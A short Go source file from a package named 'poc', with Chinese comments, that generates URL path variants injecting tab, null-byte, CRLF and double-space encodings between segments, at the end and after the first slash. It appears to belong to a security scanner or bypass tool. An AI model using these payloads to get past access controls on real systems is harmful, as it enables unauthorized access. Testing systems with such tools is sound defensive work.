package poc

import "strings"

// TabNull 生成 Tab 和 Null 字节注入 payload
func TabNull(path string) []string {
	parts := strings.Split(path, "/")
	var results []string

	injections := []string{"%09", "%00", "%0d%0a", "%20%20"}

	// 在每个路径段之间插入
	for _, inj := range injections {
		var sb strings.Builder
		for i, part := range parts {
			if part == "" && i == 0 {
				sb.WriteString("/")
				continue
			}
			if part == "" {
				continue
			}
			sb.WriteString(part)
			if i < len(parts)-1 {
				sb.WriteString(inj + "/")
			}
		}
		results = append(results, sb.String())
	}

	// 在路径末尾追加
	for _, inj := range injections {
		results = append(results, path+inj)
	}

	// 在路径开头（第一个 / 之后）插入
	if len(path) > 1 {
		for _, inj := range injections {
			results = append(results, "/"+inj+path[1:])
		}
	}

	return results
}
